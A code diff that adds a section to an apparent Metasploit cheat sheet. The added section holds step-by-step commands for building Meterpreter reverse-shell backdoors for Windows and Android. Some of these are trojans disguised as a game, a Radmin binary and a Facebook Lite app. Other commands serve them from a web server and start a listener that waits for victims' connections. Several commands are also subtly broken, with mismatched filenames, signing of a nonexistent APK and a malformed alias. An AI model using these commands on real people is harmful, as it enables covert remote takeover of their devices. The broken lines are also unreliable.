@@ -143,3 +143,33 @@ sessions -k 1 # kills selected session
 sessions -K # kills all sessions
 download # downloads file to localhost
 ##########################
+
+## Creates a backdoor with msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.74 LPORT=1234 -f exe > backdoor.exe # creates backdoor using .exe
+cp backdoor.exe /var/www/html # copies backdoor to apache server
+
+## Creates android backdoor
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.74 LPORT=1234 R > mortal-kombat.apk # same as above, but for APK
+keytool -genkey -v -keystore application.keystore -alias app -keyalg RSA -keysize 2048 -validity 10000 # generates key to android
+apksigner sign --ks application.keystore -out app_signed.apk app_signed.apk # signs apk for android
+cp mortal-kombat.apk /var/www/html # copies backdoor to apache server
+
+## Prepares msfconsole to receive connections
+msfconsole # opens msfconsole and enter commands to await connections when user enter in the executable
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.74
+set lport 1234
+set ExitOnSession false
+exploit
+###
+
+## Creates a windows trojan for backdoor
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.74 LPORT=1234 -x /usr/share/windows-binaries/rdamin.exe -f exe > radmin2.exe # creates backdoor simulating rdamin
+cp rdamin2.exe /var/www/html # copies backdoor to apache server
+
+## Creates android trojan
+_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS"
+unset _JAVA_OPTIONS
+alias 'java "$_SILENT_JAVA_OPTIONS"'
+msfvenom -x /home/vagrant/Downloads/facebook-lite.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.74 LPORT=4444 -o fb-tests.apk
